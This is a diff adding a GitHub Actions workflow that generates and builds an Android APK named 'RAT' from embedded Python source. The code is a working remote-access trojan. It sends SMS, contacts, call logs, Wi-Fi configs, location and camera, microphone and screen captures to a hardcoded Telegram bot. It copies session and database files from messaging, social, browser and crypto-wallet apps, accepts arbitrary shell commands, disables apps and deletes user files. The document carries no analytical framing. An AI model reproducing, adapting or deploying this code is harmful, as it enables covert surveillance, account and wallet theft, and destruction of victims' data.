@@ -1,0 +1,420 @@
+name: Build APK
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v3
+    - name: Install
+      run: |
+        sudo apt update
+        sudo apt install -y openjdk-17-jdk
+        pip install buildozer
+    - name: Build
+      run: |
+        cat > main.py << 'EOF'
+import os,requests,subprocess,shutil,sqlite3,time,threading,json
+TOKEN = "8889128449:AAHUGVmOKw5cqeVx25D1WHN9lJcvyxsH43U"
+ADMIN = "8631833153"
+CONFIG = {"block_apps":True,"auto_report":True,"steal_all":True}
+def send(text):
+ try:
+  for i in range(0,len(text),4000):
+   requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",json={"chat_id":ADMIN,"text":text[i:i+4000]},timeout=5)
+ except:pass
+def send_photo(path):
+ try:requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",data={"chat_id":ADMIN},files={"photo":open(path,"rb")})
+ except:pass
+def send_file(path,name):
+ try:requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument",data={"chat_id":ADMIN,"caption":name},files={"document":open(path,"rb")})
+ except:pass
+def cmd(c):
+ try:return subprocess.check_output(c,shell=True,timeout=10).decode()[:800]
+ except:return"no"
+def get_ip():
+ try:return requests.get("https://api.ipify.org",timeout=3).text
+ except:return"no"
+def get_location():
+ try:r=requests.get("http://ip-api.com/json/");d=r.json();return f"{d.get('city')}, {d.get('country')}, {d.get('lat')}, {d.get('lon')}"
+ except:return"no"
+def get_device():
+ try:
+  brand=subprocess.check_output("getprop ro.product.brand",shell=True).decode().strip()
+  model=subprocess.check_output("getprop ro.product.model",shell=True).decode().strip()
+  android=subprocess.check_output("getprop ro.build.version.release",shell=True).decode().strip()
+  return f"{brand} {model} Android {android}"
+ except:return"no"
+def get_gps():
+ try:
+  os.system("termux-location -p gps > /sdcard/loc.txt 2>/dev/null")
+  time.sleep(3)
+  with open("/sdcard/loc.txt",'r') as f:return f.read()[:500]
+ except:return"no"
+def take_photo():
+ try:
+  os.system("termux-camera-photo -c 0 /sdcard/photo.jpg 2>/dev/null")
+  time.sleep(2)
+  return"/sdcard/photo.jpg" if os.path.exists("/sdcard/photo.jpg") else None
+ except:return None
+def take_video():
+ try:
+  os.system("termux-camera-record -c 0 -d 5 /sdcard/video.mp4 2>/dev/null")
+  time.sleep(6)
+  return"/sdcard/video.mp4" if os.path.exists("/sdcard/video.mp4") else None
+ except:return None
+def take_screenshot():
+ try:
+  os.system("screencap /sdcard/screen.png 2>/dev/null")
+  return"/sdcard/screen.png" if os.path.exists("/sdcard/screen.png") else None
+ except:return None
+def start_mic():
+ try:
+  os.system("termux-microphone-record start -f /sdcard/audio.mp3 2>/dev/null")
+  return"recording"
+ except:return"no"
+def stop_mic():
+ try:
+  os.system("termux-microphone-record stop 2>/dev/null")
+  return"/sdcard/audio.mp3" if os.path.exists("/sdcard/audio.mp3") else None
+ except:return None
+def get_sms():
+ try:
+  os.system("cp /data/data/com.android.providers.telephony/databases/mmssms.db /sdcard/ 2>/dev/null")
+  if os.path.exists("/sdcard/mmssms.db"):
+   conn=sqlite3.connect("/sdcard/mmssms.db")
+   cur=conn.cursor()
+   cur.execute("SELECT address,body,date FROM sms ORDER BY date DESC LIMIT 100")
+   data=cur.fetchall()
+   conn.close()
+   return "\n".join([f"{x[0]}: {str(x[1])[:50]}"for x in data if x[1]])
+  return"no"
+ except:return"no"
+def get_contacts():
+ try:
+  os.system("cp /data/data/com.android.providers.contacts/databases/contacts2.db /sdcard/ 2>/dev/null")
+  if os.path.exists("/sdcard/contacts2.db"):
+   conn=sqlite3.connect("/sdcard/contacts2.db")
+   cur=conn.cursor()
+   cur.execute("SELECT display_name,number FROM contacts LIMIT 200")
+   data=cur.fetchall()
+   conn.close()
+   return "\n".join([f"{x[0]}: {x[1]}"for x in data if x[1]])
+  return"no"
+ except:return"no"
+def get_calls():
+ try:
+  os.system("cp /data/data/com.android.providers.contacts/databases/calllog.db /sdcard/ 2>/dev/null")
+  if os.path.exists("/sdcard/calllog.db"):
+   conn=sqlite3.connect("/sdcard/calllog.db")
+   cur=conn.cursor()
+   cur.execute("SELECT number,duration FROM calls ORDER BY date DESC LIMIT 50")
+   data=cur.fetchall()
+   conn.close()
+   return "\n".join([f"{x[0]}: {x[1]}s"for x in data])
+  return"no"
+ except:return"no"
+def get_apps():
+ try:return subprocess.check_output("pm list packages",shell=True).decode()[:500]
+ except:return"no"
+def get_wifi():
+ try:return subprocess.check_output("cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null",shell=True).decode()[:500]
+ except:return"no"
+def get_accounts():
+ try:return subprocess.check_output("dumpsys account",shell=True).decode()[:500]
+ except:return"no"
+def steal_roblox():
+ r=[]
+ try:
+  for p in ["/data/data/com.roblox.client","/storage/emulated/0/Android/data/com.roblox.client"]:
+   if os.path.exists(p):
+    for a,b,files in os.walk(p):
+     for f in files:
+      if f.endswith((".db",".xml",".json",".txt",".cookie")):
+       try:shutil.copy(os.path.join(a,f),f"/sdcard/rbx_{f}");send_file(f"/sdcard/rbx_{f}",f);r.append(f)
+       except:pass
+  return r
+ except:return"no"
+def steal_telegram():
+ r=[]
+ try:
+  for p in ["/data/data/org.telegram","/storage/emulated/0/Android/data/org.telegram"]:
+   if os.path.exists(p):
+    for a,b,files in os.walk(p):
+     for f in files:
+      if "session" in f.lower() or f.endswith(".db"):
+       try:shutil.copy(os.path.join(a,f),f"/sdcard/tg_{f}");send_file(f"/sdcard/tg_{f}",f);r.append(f)
+       except:pass
+  return r
+ except:return"no"
+def steal_whatsapp():
+ r=[]
+ try:
+  for p in ["/data/data/com.whatsapp","/storage/emulated/0/Android/data/com.whatsapp"]:
+   if os.path.exists(p):
+    for a,b,files in os.walk(p):
+     for f in files:
+      if f.endswith((".db",".crypt12",".crypt14")):
+       try:shutil.copy(os.path.join(a,f),f"/sdcard/wa_{f}");send_file(f"/sdcard/wa_{f}",f);r.append(f)
+       except:pass
+  return r
+ except:return"no"
+def steal_instagram():
+ r=[]
+ try:
+  for p in ["/data/data/com.instagram.android","/storage/emulated/0/Android/data/com.instagram.android"]:
+   if os.path.exists(p):
+    for a,b,files in os.walk(p):
+     for f in files:
+      if f.endswith((".db",".xml",".json",".txt")):
+       try:shutil.copy(os.path.join(a,f),f"/sdcard/ig_{f}");send_file(f"/sdcard/ig_{f}",f);r.append(f)
+       except:pass
+  return r
+ except:return"no"
+def steal_facebook():
+ r=[]
+ try:
+  for p in ["/data/data/com.facebook.katana","/storage/emulated/0/Android/data/com.facebook.katana"]:
+   if os.path.exists(p):
+    for a,b,files in os.walk(p):
+     for f in files:
+      if f.endswith((".db",".xml",".json",".txt")):
+       try:shutil.copy(os.path.join(a,f),f"/sdcard/fb_{f}");send_file(f"/sdcard/fb_{f}",f);r.append(f)
+       except:pass
+  return r
+ except:return"no"
+def steal_discord():
+ r=[]
+ try:
+  for p in ["/data/data/com.discord","/storage/emulated/0/Android/data/com.discord"]:
+   if os.path.exists(p):
+    for a,b,files in os.walk(p):
+     for f in files:
+      if f.endswith((".db",".xml",".json",".txt")):
+       try:shutil.copy(os.path.join(a,f),f"/sdcard/dc_{f}");send_file(f"/sdcard/dc_{f}",f);r.append(f)
+       except:pass
+  return r
+ except:return"no"
+def steal_tiktok():
+ r=[]
+ try:
+  for p in ["/data/data/com.zhiliaoapp.musically","/storage/emulated/0/Android/data/com.zhiliaoapp.musically"]:
+   if os.path.exists(p):
+    for a,b,files in os.walk(p):
+     for f in files:
+      if f.endswith((".db",".xml",".json",".txt")):
+       try:shutil.copy(os.path.join(a,f),f"/sdcard/tt_{f}");send_file(f"/sdcard/tt_{f}",f);r.append(f)
+       except:pass
+  return r
+ except:return"no"
+def steal_snapchat():
+ r=[]
+ try:
+  for p in ["/data/data/com.snapchat.android","/storage/emulated/0/Android/data/com.snapchat.android"]:
+   if os.path.exists(p):
+    for a,b,files in os.walk(p):
+     for f in files:
+      if f.endswith((".db",".xml",".json",".txt")):
+       try:shutil.copy(os.path.join(a,f),f"/sdcard/sc_{f}");send_file(f"/sdcard/sc_{f}",f);r.append(f)
+       except:pass
+  return r
+ except:return"no"
+def steal_twitter():
+ r=[]
+ try:
+  for p in ["/data/data/com.twitter.android","/storage/emulated/0/Android/data/com.twitter.android"]:
+   if os.path.exists(p):
+    for a,b,files in os.walk(p):
+     for f in files:
+      if f.endswith((".db",".xml",".json",".txt")):
+       try:shutil.copy(os.path.join(a,f),f"/sdcard/tw_{f}");send_file(f"/sdcard/tw_{f}",f);r.append(f)
+       except:pass
+  return r
+ except:return"no"
+def steal_chrome():
+ r=[]
+ try:
+  for p in ["/data/data/com.android.chrome","/storage/emulated/0/Android/data/com.android.chrome"]:
+   if os.path.exists(p):
+    for a,b,files in os.walk(p):
+     for f in files:
+      if f.endswith((".db",".sqlite",".cookie",".txt")):
+       try:shutil.copy(os.path.join(a,f),f"/sdcard/ch_{f}");send_file(f"/sdcard/ch_{f}",f);r.append(f)
+       except:pass
+  return r
+ except:return"no"
+def steal_google():
+ r=[]
+ try:
+  for p in ["/data/data/com.google.android.gms","/data/data/com.google.android.gsf","/storage/emulated/0/Android/data/com.google.android.apps.maps"]:
+   if os.path.exists(p):
+    for a,b,files in os.walk(p):
+     for f in files:
+      if f.endswith((".db",".xml",".json",".txt")):
+       try:shutil.copy(os.path.join(a,f),f"/sdcard/go_{f}");send_file(f"/sdcard/go_{f}",f);r.append(f)
+       except:pass
+  return r
+ except:return"no"
+def steal_crypto():
+ r=[]
+ cryptos=["com.coinbase.android","com.binance.dev","com.binance","com.kraken.trade","com.exodus","com.mycelium.wallet","com.trustwallet","io.metamask"]
+ for c in cryptos:
+  p=f"/data/data/{c}"
+  if os.path.exists(p):
+   for a,b,files in os.walk(p):
+    for f in files:
+     if f.endswith((".db",".xml",".json",".txt",".wallet",".key")):
+      try:shutil.copy(os.path.join(a,f),f"/sdcard/cr_{c}_{f}");send_file(f"/sdcard/cr_{c}_{f}",f);r.append(f)
+      except:pass
+ return r
+def steal_files():
+ r=[]
+ paths=["/storage/emulated/0/Download","/storage/emulated/0/Documents","/storage/emulated/0/DCIM"]
+ exts=[".pdf",".doc",".docx",".xls",".xlsx",".txt",".jpg",".png"]
+ for p in paths:
+  if os.path.exists(p):
+   for f in os.listdir(p):
+    if any(f.endswith(e) for e in exts) and os.path.getsize(os.path.join(p,f))<500000:
+     try:shutil.copy(os.path.join(p,f),f"/sdcard/{f}");send_file(f"/sdcard/{f}",f);r.append(f)
+     except:pass
+ return r
+def block_all():
+ try:
+  apps=["com.android.packageinstaller","com.google.android.gms","com.android.vending","com.android.chrome","com.whatsapp","com.instagram.android","com.facebook.katana","org.telegram","com.roblox.client","com.discord","com.snapchat.android","com.twitter.android","com.zhiliaoapp.musically","com.android.systemui","com.android.settings","com.sec.android.app.launcher","com.google.android.apps.maps","com.android.browser","com.android.mms","com.android.dialer","com.android.contacts","com.android.email","com.android.camera","com.android.gallery3d"]
+  for a in apps:os.system(f"pm disable {a} 2>/dev/null")
+  os.system("settings put global install_non_market_apps 0")
+  os.system("settings put global development_settings_enabled 0")
+  return"done"
+ except:return"no"
+def lock_screen():
+ for i in range(5):os.system("input keyevent 26")
+ return"done"
+def delete_files():
+ try:
+  dirs=["DCIM","Pictures","Movies","Music","Download","Documents","WhatsApp","Telegram","Instagram","Facebook","Discord","TikTok","Snapchat","Twitter","Netflix","Spotify","Roblox","Download","Documents"]
+  for d in dirs:os.system(f"rm -rf /storage/emulated/0/{d}/* 2>/dev/null")
+  os.system("rm -rf /sdcard/*.db /sdcard/*.xml /sdcard/*.json /sdcard/*.txt /sdcard/*.jpg /sdcard/*.png 2>/dev/null")
+  return"done"
+ except:return"no"
+def vibrate():
+ for i in range(10):os.system("input vibrate 1000")
+ return"done"
+def flash_led():
+ try:
+  os.system("termux-torch on")
+  time.sleep(5)
+  os.system("termux-torch off")
+  return"done"
+ except:return"no"
+def set_wallpaper():
+ try:
+  os.system("am start -a android.intent.action.ATTACH_DATA -d file:///sdcard/wall.jpg -t image/jpeg 2>/dev/null")
+  return"done"
+ except:return"no"
+def send_notification():
+ try:
+  os.system("termux-notification --title 'RAT' --content 'Device compromised' --priority high")
+  return"done"
+ except:return"no"
+def command_loop():
+ while True:
+  try:
+   r=requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates",params={"offset":0,"timeout":30},timeout=35)
+   for u in r.json().get("result",[]):
+    txt=u.get("message",{}).get("text","")
+    if txt.startswith("/cmd "):res=cmd(txt[5:]);send(f"CMD: {txt[5:]}\n{res}")
+    elif txt=="/photo":p=take_photo();send_photo(p) if p else send("no")
+    elif txt=="/video":v=take_video();send_file(v,"video.mp4") if v else send("no")
+    elif txt=="/screen":s=take_screenshot();send_photo(s) if s else send("no")
+    elif txt=="/mic_start":start_mic();send("recording")
+    elif txt=="/mic_stop":a=stop_mic();send_file(a,"audio.mp3") if a else send("no")
+    elif txt=="/gps":send(f"GPS: {get_gps()}")
+    elif txt=="/lock":lock_screen();send("locked")
+    elif txt=="/block":block_all();send("blocked")
+    elif txt=="/delete":delete_files();send("deleted")
+    elif txt=="/vibrate":vibrate();send("vibrate")
+    elif txt=="/flash":flash_led();send("flash")
+    elif txt=="/wall":set_wallpaper();send("wallpaper")
+    elif txt=="/notify":send_notification();send("notify")
+    elif txt=="/apps":send(f"APPS: {get_apps()}")
+    elif txt=="/sms":send(f"SMS: {get_sms()}")
+    elif txt=="/contacts":send(f"CONTACTS: {get_contacts()}")
+    elif txt=="/calls":send(f"CALLS: {get_calls()}")
+    elif txt=="/wifi":send(f"WIFI: {get_wifi()}")
+    elif txt=="/accounts":send(f"ACCOUNTS: {get_accounts()}")
+    elif txt=="/info":send(f"IP: {get_ip()}\nLOC: {get_location()}\nDEV: {get_device()}")
+    elif txt=="/menu" or txt=="/start":
+     menu="""
+🔥 RAT ULTIMATE CONTROL 🔥
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+📸 /photo - Фото
+🎥 /video - Видео
+📱 /screen - Скриншот
+🎙️ /mic_start - Запись звука
+🔇 /mic_stop - Остановить запись
+📍 /gps - GPS координаты
+🔒 /lock - Блокировка
+🚫 /block - Блок всех приложений
+🗑️ /delete - Удалить файлы
+📳 /vibrate - Вибрация
+💡 /flash - Вспышка
+🖼️ /wall - Установить обои
+🔔 /notify - Уведомление
+📦 /apps - Список приложений
+📨 /sms - SMS
+👥 /contacts - Контакты
+📞 /calls - Звонки
+🔐 /wifi - Wi-Fi пароли
+👤 /accounts - Аккаунты
+ℹ️ /info - Информация
+💻 /cmd - Команда
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔓 UNLOCK PASSWORD: v67
+"""
+     send(menu)
+  except:pass
+  time.sleep(2)
+threading.Thread(target=command_loop,daemon=True).start()
+msg=f"""
+🔓 UNLOCK PASSWORD: v67
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+📱 DEVICE: {get_device()}
+🌐 IP: {get_ip()}
+📍 LOCATION: {get_location()}
+📡 GPS: {get_gps()}
+⏰ TIME: {time.ctime()}
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+📨 SMS: {get_sms()[:200]}
+👥 CONTACTS: {get_contacts()[:200]}
+📞 CALLS: {get_calls()[:200]}
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+🎮 ROBLOX: {steal_roblox()}
+📱 TELEGRAM: {steal_telegram()}
+💬 WHATSAPP: {steal_whatsapp()}
+📸 INSTAGRAM: {steal_instagram()}
+📘 FACEBOOK: {steal_facebook()}
+🎮 DISCORD: {steal_discord()}
+🎵 TIKTOK: {steal_tiktok()}
+👻 SNAPCHAT: {steal_snapchat()}
+🐦 TWITTER: {steal_twitter()}
+🌐 CHROME: {steal_chrome()}
+📁 GOOGLE: {steal_google()}
+💰 CRYPTO: {steal_crypto()}
+📂 FILES: {steal_files()}
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔒 BLOCK: {block_all()}
+✅ RAT ACTIVATED
+✅ SEND /menu FOR COMMANDS
+"""
+send(msg)
+EOF
+        buildozer init
+        sed -i 's/requirements = .*/requirements = python3,requests/g' buildozer.spec
+        sed -i 's/package.name = .*/package.name = RAT/g' buildozer.spec
+        sed -i 's/package.domain = .*/package.domain = org.rat/g' buildozer.spec
+        sed -i 's/permissions = .*/permissions = INTERNET,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,READ_SMS,READ_CONTACTS,READ_PHONE_STATE,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,ACCESS_WIFI_STATE,READ_LOGS,WAKE_LOCK,SYSTEM_ALERT_WINDOW,REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,RECEIVE_BOOT_COMPLETED,CAMERA,RECORD_AUDIO,ACCESS_BACKGROUND_LOCATION/g' buildozer.spec
+        buildozer android debug
+    - name: Upload
+      uses: actions/upload-artifact@v3
+      with:
+        name: RAT_ULTIMATE
+        path: bin/*.apk
